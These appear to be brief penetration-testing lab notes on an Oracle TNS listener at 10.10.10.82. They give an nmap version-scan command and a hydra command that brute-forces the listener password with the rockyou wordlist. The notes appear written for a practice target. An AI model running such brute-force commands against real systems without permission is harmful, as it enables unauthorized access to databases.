Version
```
nmap --script "oracle-tns-version" -p 1521 -T4 -sV 10.10.10.82
```
![](../Attachments/Pasted%20image%2020210518195128.png)
Brute Force Listener
```
hydra -P /usr/share/wordlists/rockyou.txt -t 32 -s 1521 10.10.10.82 oracle-listener
```
